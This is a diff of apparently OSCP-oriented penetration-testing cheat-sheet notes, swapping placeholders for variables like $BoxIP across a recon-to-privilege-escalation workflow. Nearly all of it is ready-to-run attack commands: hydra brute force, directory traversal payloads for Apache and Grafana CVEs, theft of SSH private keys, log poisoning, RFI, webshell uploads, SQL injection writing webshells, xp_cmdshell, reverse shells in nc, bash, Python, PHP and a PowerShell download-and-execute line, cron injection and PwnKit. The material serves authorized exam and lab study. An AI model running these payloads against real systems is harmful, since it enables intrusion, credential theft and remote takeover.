@@ -9,13 +9,13 @@ Part of [[METHODOLOGY CHEAT SHEET]]. Recon → web app exploitation → shells �
 #### Step 1: Port Scanning
 ```bash
 # Quick TCP scan (top 1000 ports)
-nmap -v -sS -sV -Pn --top-ports 1000 -oA nmap_quick <target>
+nmap -v -sS -sV -Pn --top-ports 1000 -oA nmap_quick $BoxIP
 
 # Full TCP scan (all ports)
-nmap -sT -p- --min-rate 5000 --max-retries 1 -oA nmap_full <target>
+nmap -sT -p- --min-rate 5000 --max-retries 1 -oA nmap_full $BoxIP
 
 # UDP scan (top 100)
-nmap -v -sU -T4 -Pn --top-ports 100 -oA nmap_udp <target>
+nmap -v -sU -T4 -Pn --top-ports 100 -oA nmap_udp $BoxIP
 ```
 
 **What to look for**:
@@ -33,19 +33,19 @@ nmap -v -sU -T4 -Pn --top-ports 100 -oA nmap_udp <target>
 
 ```bash
 # Basic record lookups
-host <domain>
-host -t mx <domain>
-host -t txt <domain>
+host $Domain
+host -t mx $Domain
+host -t txt $Domain
 
 # Forward brute force against a wordlist
-for ip in $(cat list.txt); do host $ip.<domain>; done
+for ip in $(cat list.txt); do host $ip.$Domain; done
 
 # Reverse brute force across a discovered IP range (negative-grep filters out the noise)
 for ip in $(seq <start> <end>); do host <subnet>.$ip; done | grep -Ev "not found|timed out"
 
 # Automated all-in-one tools
-dnsrecon -d <domain> -t std
-dnsenum <domain>
+dnsrecon -d $Domain -t std
+dnsenum $Domain
 ```
 *Worth doing before or alongside port scanning, not as an afterthought, a discovered subdomain or internal hostname often reveals a whole second attack surface a plain IP-based scan would never find. Full syntax reference: [[Reconnaissance & Enumeration#DNS Enumeration|Command Appendix]].*
 
@@ -54,7 +54,7 @@ dnsenum <domain>
 
 ```bash
 # Lightweight, targeted: NSE against whatever ports the earlier scan found open
-sudo nmap -sV -p <port> --script "vuln" <target>
+sudo nmap -sV -p $Port --script "vuln" $BoxIP
 
 # Nessus: GUI-driven, heavier, broader plugin coverage (168,000+ plugins). Install/CLI
 # reference: [[Reconnaissance & Enumeration#Nessus (Install & CLI)|Command Appendix]]
@@ -66,21 +66,21 @@ sudo nmap -sV -p <port> --script "vuln" <target>
 
 ```bash
 # Web server fingerprinting
-nmap -p80 -sV <target>
-nmap -p80 --script=http-enum <target>
+nmap -p80 -sV $BoxIP
+nmap -p80 --script=http-enum $BoxIP
 
 # Directory brute force
-gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,sh,cgi
+gobuster dir -u http://$BoxIP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,sh,cgi
 
 # API path brute force (pattern file containing {GOBUSTER}/v1 etc.)
-gobuster dir -u http://<target>:<port> -w /usr/share/wordlists/dirb/big.txt -p pattern
+gobuster dir -u http://$BoxIP:$Port -w /usr/share/wordlists/dirb/big.txt -p pattern
 
 # Tech stack identification
-whatweb http://<target>
-wpscan --url http://<target> --enumerate p,vt
+whatweb http://$BoxIP
+wpscan --url http://$BoxIP --enumerate p,vt
 
 # robots.txt / sitemap check
-curl http://<target>/robots.txt
+curl http://$BoxIP/robots.txt
 ```
 
 **Proxy everything through Burp before manual testing:** launch with `burpsuite`, Intercept off, point the browser's manual proxy config at `127.0.0.1:8080`. Full setup + Repeater/Intruder syntax: [[Web Applications#Burp Suite|Command Appendix]].
@@ -98,24 +98,24 @@ curl http://<target>/robots.txt
 #### Step 3: Service-Specific Enumeration
 ```bash
 # SMB
-enum4linux <target>
-smbclient -U guest -L //<target>
+enum4linux $BoxIP
+smbclient -U guest -L //$BoxIP
 
 # FTP
-ftp <target>  # Try anonymous login
+ftp $BoxIP  # Try anonymous login
 
 # SMTP
-nc -nv <target> 25
+nc -nv $BoxIP 25
 VRFY root
 EXPN mail
 
 # SNMP
-snmpwalk -c public -v1 <target>
-onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>
+snmpwalk -c public -v1 $BoxIP
+onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt $BoxIP
 
 # NFS
-showmount -e <target>
-mount -t nfs <target>:/share /mnt/nfs
+showmount -e $BoxIP
+mount -t nfs $BoxIP:/share /mnt/nfs
 ```
 
 ---
@@ -125,7 +125,7 @@ mount -t nfs <target>:/share /mnt/nfs
 #### Step 1: Service Exploitation
 ```bash
 # Weak credentials
-hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target> -t 4
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$BoxIP -t 4
 
 # Web exploits
 searchsploit <software> <version>
@@ -142,9 +142,9 @@ sqlmap -u "http://target/page?id=1" --batch
 
 ```python
 # Fix target URL/protocol, TLS verification, and credentials to match the real target
-base_url = "https://<real-target>/admin"
+base_url = "https://$BoxIP/admin"
 response = requests.post(url, data=data, verify=False)   # skip self-signed cert errors
-username, password = "<real-user>", "<real-pass>"
+username, password = "$Username", "$Password"
 ```
 **Confusing downstream error after auth succeeds** (`IndexError`, `KeyError`, etc)? Don't assume the exploit's broken, print the actual data right before the failing line, a hardcoded param name (CSRF token field, etc) not matching this target's real one is a common cause:
 ```python
@@ -163,24 +163,24 @@ Full syntax: [[Fixing Exploits (Breakdowns)|Command Breakdowns]]. Troubleshootin
 
 ```bash
 # Directory Traversal / LFI probe. Swap in likely parameter names (page, file, path, template, doc...)
-curl "http://<target>/index.php?page=../../../../../../../../../etc/passwd"
-curl "http://<target>/index.php?page=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"   # URL-encoded variant
-curl "http://<target>/index.php?page=..\..\..\..\..\..\windows\system32\drivers\etc\hosts"  # Windows target, try backslash too
+curl "http://$BoxIP/index.php?page=../../../../../../../../../etc/passwd"
+curl "http://$BoxIP/index.php?page=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"   # URL-encoded variant
+curl "http://$BoxIP/index.php?page=..\..\..\..\..\..\windows\system32\drivers\etc\hosts"  # Windows target, try backslash too
 
 # If plain ../ 404s / gets filtered, try percent-encoding the dots. Bypasses filters matching only the literal string
-curl "http://<target>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+curl "http://$BoxIP/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
 # Apache CVE-2021-41773/42013 specifically wants an asymmetric first segment. Try this exact pattern if the uniform one above 404s regardless of depth:
-curl --path-as-is "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+curl --path-as-is "http://$BoxIP/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
 
 # Grafana CVE-2021-43798 (any core plugin path works, alertlist always present, no auth needed)
-curl http://<target>:3000/api/health   # confirm version is 8.0.0-beta1 through 8.3.0
-curl --path-as-is "http://<target>:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd"
+curl http://$BoxIP:3000/api/health   # confirm version is 8.0.0-beta1 through 8.3.0
+curl --path-as-is "http://$BoxIP:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd"
 
 # Extract a multi-line secret (private key, cert) found via traversal. NEVER copy/paste manually, extract mechanically
-curl -s "http://<target>/index.php?page=../../../../../../home/<user>/.ssh/id_rsa" -o raw_response.txt
+curl -s "http://$BoxIP/index.php?page=../../../../../../home/$Username/.ssh/id_rsa" -o raw_response.txt
 sed -n '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p' raw_response.txt > stolen_key
 chmod 400 stolen_key
-ssh -i stolen_key <user>@<target>   # add -p <port> if non-standard
+ssh -i stolen_key $Username@$BoxIP   # add -p $Port if non-standard
 ```
 
 **What to look for (traversal/LFI)**:
@@ -192,42 +192,42 @@ ssh -i stolen_key <user>@<target>   # add -p <port> if non-standard
 
 ```bash
 # LFI to RCE via log poisoning (Linux, Apache). Inject a PHP snippet through a controllable header, then include the log
-curl "http://<target>/index.php?page=../../../../../../../../../var/log/apache2/access.log"   # confirm User-Agent lands in the log
+curl "http://$BoxIP/index.php?page=../../../../../../../../../var/log/apache2/access.log"   # confirm User-Agent lands in the log
 # In Burp Repeater: set User-Agent to <?php echo system($_GET['cmd']); ?>, send, then remove the header and re-request with:
 #   page=../../../../../../../../../var/log/apache2/access.log&cmd=<command>   (URL-encode spaces as %20)
 # Windows/XAMPP log path instead: xampp/apache/logs/access.log
 
 # php://filter to read PHP source instead of executing it
-curl "http://<target>/index.php?page=php://filter/convert.base64-encode/resource=<file>.php"
+curl "http://$BoxIP/index.php?page=php://filter/convert.base64-encode/resource=$BoxDir.php"
 echo "<base64 output>" | base64 -d
 
 # data:// wrapper, inline payload, no log/file write needed (requires allow_url_include)
-curl "http://<target>/index.php?page=data://text/plain,<?php%20echo%20system('id');?>"
+curl "http://$BoxIP/index.php?page=data://text/plain,<?php%20echo%20system('id');?>"
 
 # RFI, host your own payload and include it remotely (also requires allow_url_include)
 cd /usr/share/webshells/php/ && python3 -m http.server 80
-curl "http://<target>/index.php?page=http://<your_ip>/simple-backdoor.php&cmd=id"
+curl "http://$BoxIP/index.php?page=http://$LocalIP/simple-backdoor.php&cmd=id"
 
 # Executable file upload, try direct .php first, then bypass tricks if blocked
 # Case-swap extension (.pHP), alternate extensions (.phps, .php7), or upload as .txt then rename via the app
-curl "http://<target>/uploads/shell.pHP?cmd=id"
+curl "http://$BoxIP/uploads/shell.pHP?cmd=id"
 
 # Same idea on IIS/ASP.NET: Kali ships a ready webshell, upload via the browser (ASP.NET WebForms
 # viewstate tokens are fiddly to hand-craft with curl), then drive it from the browser directly
 ls /usr/share/webshells/aspx/   # cmdasp.aspx
-curl http://<target>/cmdasp.aspx   # confirm it landed once uploaded
+curl http://$BoxIP/cmdasp.aspx   # confirm it landed once uploaded
 
 # Upload + traversal combo (upload mechanism has no code-execution path at all)
 # Intercept the upload in Burp, rewrite the multipart filename field to a traversal path targeting authorized_keys:
 #   filename="../../../../../../../root/.ssh/authorized_keys"   (content = your own fileup.pub)
 ssh-keygen -f fileup && cat fileup.pub > authorized_keys
 rm ~/.ssh/known_hosts   # if the hostname was used for an earlier, different box
-ssh -i fileup root@<target>   # add -p <port> if non-standard
+ssh -i fileup root@$BoxIP   # add -p $Port if non-standard
 
 # Command injection: identify by replacing a command-shaped parameter value entirely, then narrowing down what the filter blocks
-curl -X POST --data 'param=<harmless-os-command>' http://<target>/<endpoint>   # e.g. ipconfig / id
-curl -X POST --data 'param=<expected-command>' http://<target>/<endpoint>       # confirm the base command alone still works
-curl -X POST --data 'param=<expected-command>%3B<injected-command>' http://<target>/<endpoint>   # %3B = URL-encoded ; chains a second command
+curl -X POST --data 'param=<harmless-os-command>' http://$BoxIP/<endpoint>   # e.g. ipconfig / id
+curl -X POST --data 'param=<expected-command>' http://$BoxIP/<endpoint>       # confirm the base command alone still works
+curl -X POST --data 'param=<expected-command>%3B<injected-command>' http://$BoxIP/<endpoint>   # %3B = URL-encoded ; chains a second command
 # Also try && and (CMD only) a single &, in case ; specifically is filtered
 
 # Detect CMD vs PowerShell on Windows (credit: PetSerAl)
@@ -236,20 +236,20 @@ curl -X POST --data 'param=<expected-command>%3B<injected-command>' http://<targ
 # PowerShell reverse shell via Powercat, once you know you're in a PowerShell context
 cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
 python3 -m http.server 80
-# Inject (URL-encoded): IEX (New-Object System.Net.Webclient).DownloadString("http://<your_ip>/powercat.ps1");powercat -c <your_ip> -p 4444 -e powershell
+# Inject (URL-encoded): IEX (New-Object System.Net.Webclient).DownloadString("http://$LocalIP/powercat.ps1");powercat -c $LocalIP -p 4444 -e powershell
 
 # Linux reverse shell via command injection, if unfiltered enough to send it directly
 # IMPORTANT: use --data-urlencode, not --data, whenever the payload contains & = or spaces
 # --data sends the value raw (application/x-www-form-urlencoded), so a literal & in a reverse shell
 # one-liner (>&, 0>&1) gets read as a form-field separator and silently truncates your payload
-curl -X POST --data-urlencode 'Archive=bash -c "bash -i >& /dev/tcp/<your_ip>/4444 0>&1"' http://<target>/archive
+curl -X POST --data-urlencode 'Archive=bash -c "bash -i >& /dev/tcp/$LocalIP/4444 0>&1"' http://$BoxIP/archive
 
 # No git/command-shaped hint at all? Work through injection types systematically, watch for ANY change
 # in behavior (blank/different response), not just a direct hit
-curl -X POST --data 'param=1%2B1' http://<target>/<endpoint>       # eval()? expect "2" back if so
-curl -X POST --data 'param={{7*7}}' http://<target>/<endpoint>     # Jinja2 SSTI? expect "49" back if so
-curl -X POST --data-urlencode 'param=`id`' http://<target>/<endpoint>          # plain OS injection via backticks
-curl -X POST --data-urlencode 'param=$(id)' http://<target>/<endpoint>        # or command substitution
+curl -X POST --data 'param=1%2B1' http://$BoxIP/<endpoint>       # eval()? expect "2" back if so
+curl -X POST --data 'param={{7*7}}' http://$BoxIP/<endpoint>     # Jinja2 SSTI? expect "49" back if so
+curl -X POST --data-urlencode 'param=`id`' http://$BoxIP/<endpoint>          # plain OS injection via backticks
+curl -X POST --data-urlencode 'param=$(id)' http://$BoxIP/<endpoint>        # or command substitution
 ```
 
 **What to look for (LFI/RFI/upload/command injection)**:
@@ -268,8 +268,8 @@ curl -X POST --data-urlencode 'param=$(id)' http://<target>/<endpoint>        # 
 
 ```bash
 # Connect directly to a DB (useful when creds are already known, or after finding them elsewhere)
-mysql -u root -p'root' -h <target> -P 3306 --skip-ssl-verify-server-cert   # add --skip-ssl if TLS errors
-impacket-mssqlclient <user>:<pass>@<target> -windows-auth
+mysql -u root -p'root' -h $BoxIP -P 3306 --skip-ssl-verify-server-cert   # add --skip-ssl if TLS errors
+impacket-mssqlclient $Username:$Password@$BoxIP -windows-auth
 
 # Auth bypass in a login form's username field
 offsec' OR 1=1 -- //
@@ -284,12 +284,12 @@ offsec' OR 1=1 -- //
 ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
 
 # Blind SQLi tests (no visible output; infer from behavior/timing instead)
-<target>?user=offsec' AND 1=1 -- //                          # boolean-based
-<target>?user=offsec' AND IF (1=1, sleep(3),'false') -- //   # time-based
+$BoxIP?user=offsec' AND 1=1 -- //                          # boolean-based
+$BoxIP?user=offsec' AND IF (1=1, sleep(3),'false') -- //   # time-based
 
 # MySQL: write a webshell to disk via UNION + INTO OUTFILE (needs a writable web-servable path)
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
-curl "http://<target>/tmp/webshell.php?cmd=id"
+curl "http://$BoxIP/tmp/webshell.php?cmd=id"
 
 # MSSQL: enable and use xp_cmdshell
 EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
@@ -305,8 +305,8 @@ EXECUTE xp_cmdshell 'whoami';
 ' UNION SELECT NULL,CAST((SELECT string_agg(cmd_output,' | ')) AS int),NULL FROM cmd_exec-- 
 
 # Automate with sqlmap
-sqlmap -u "http://<target>/page.php?id=1" -p id                 # discovery/fingerprint
-sqlmap -u "http://<target>/page.php?id=1" -p id --dump           # dump current DB
+sqlmap -u "http://$BoxIP/page.php?id=1" -p id                 # discovery/fingerprint
+sqlmap -u "http://$BoxIP/page.php?id=1" -p id --dump           # dump current DB
 sqlmap -r post.txt -p <param> --os-shell --web-root "/var/www/html/tmp"   # full OS shell (capture POST via Burp first)
 ```
 
@@ -327,7 +327,7 @@ sqlmap -r post.txt -p <param> --os-shell --web-root "/var/www/html/tmp"   # full
 **Netcat**:
 ```bash
 # Reverse shell
-nc <attacker_ip> 4444 -e /bin/bash
+nc $LocalIP 4444 -e /bin/bash
 
 # Attacker listener
 rlwrap nc -nlvp 4444
@@ -335,22 +335,22 @@ rlwrap nc -nlvp 4444
 
 **Bash**:
 ```bash
-bash -c "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1"
+bash -c "bash -i >& /dev/tcp/$LocalIP/4444 0>&1"
 ```
 
 **Python**:
 ```bash
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LocalIP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 **PHP**:
 ```php
-<?php echo shell_exec("/bin/bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1");?>
+<?php echo shell_exec("/bin/bash -i >& /dev/tcp/$LocalIP/4444 0>&1");?>
 ```
 
 **MSFVenom**:
 ```bash
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LocalIP LPORT=4444 -f elf -o shell.elf
 chmod +x shell.elf
 ./shell.elf
 ```
@@ -418,7 +418,7 @@ cat ~/.bashrc ~/.bash_history ~/.zshrc 2>/dev/null
 
 ```bash
 # unix-privesc-check (pre-installed on Kali, fast, low noise)
-scp /usr/bin/unix-privesc-check user@<TARGET>:~/
+scp /usr/bin/unix-privesc-check user@$BoxIP:~/
 ./unix-privesc-check standard 2>/dev/null | grep -A 2 "WARNING"
 
 # LinPEAS (more comprehensive, colour-coded red/yellow = high confidence)
@@ -436,7 +436,7 @@ su - root
 
 # Build targeted wordlist from partial credential (e.g. Lab+3 digits)
 crunch 6 6 -t Lab%%% > wordlist.txt
-hydra -l <user> -P wordlist.txt <target_ip> -t 4 ssh -V
+hydra -l $Username -P wordlist.txt $BoxIP -t 4 ssh -V
 
 # Sniff loopback if tcpdump is allowed via sudo
 watch -n 1 "ps -aux | grep pass"          # passively watch for cleartext in process args
@@ -453,8 +453,8 @@ ls -lah /path/to/script.sh                # look for -rwxrwxrw- or -rwxrwxrwx
 
 # Inject reverse shell (append -- never overwrite)
 echo >> /path/to/script.sh
-echo "bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1" >> /path/to/script.sh
-nc -lnvp <PORT>   # wait up to one cron interval (~60 sec)
+echo "bash -i >& /dev/tcp/$LocalIP/$Port 0>&1" >> /path/to/script.sh
+nc -lnvp $Port   # wait up to one cron interval (~60 sec)
 ```
 
 **/etc/passwd writable (world-write OR owned by your user):**
@@ -521,12 +521,12 @@ snap --version         # snapd < 2.37.1 → dirty_sock (CVE-2019-7304)
 searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
 
 # Always compile on the target to avoid glibc mismatch
-scp exploit.c user@<TARGET>:~/
+scp exploit.c user@$BoxIP:~/
 # on target: gcc exploit.c -o exploit && ./exploit
 
 # PwnKit (not in searchsploit -- clone from GitHub):
 git clone https://github.com/berdav/CVE-2021-4034.git /tmp/pwnkit
-scp -r /tmp/pwnkit user@<TARGET>:/tmp/pwnkit
+scp -r /tmp/pwnkit user@$BoxIP:/tmp/pwnkit
 # on target: cd /tmp/pwnkit && gcc -Wall --shared -fPIC -o pwnkit.so pwnkit.c && gcc -Wall cve-2021-4034.c -o cve-2021-4034-local && ./cve-2021-4034-local
 ```
 
@@ -599,7 +599,7 @@ set SRVPORT 9050; set SRVHOST 0.0.0.0; set VERSION 4a
 run
 
 sessions -i 1
-run autoroute -s <target-subnet>/<mask>
+run autoroute -s $BoxIP/<mask>
 ```
 
 Then on Kali: `socks4 127.0.0.1 9050` in `/etc/proxychains4.conf`, and `proxychains` prefix your tools as normal.
@@ -642,3 +642,18 @@ sudo sed -i 's/socks5 .*/socks4 127.0.0.1 9050/' /etc/proxychains4.conf
 ```
 
 #### Tags: #Pivoting #PortForwarding #SSHTunneling #Proxychains #Meterpreter #Rpivot #Dnscat2 #ptunnel-ng #SocksOverRDP #Module19 #HTBSupplementary
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/18. Linux Privilege Escalation]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- demonstrates the workflow described here
+## External Resources
+
+- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
+- https://www.revshells.com/
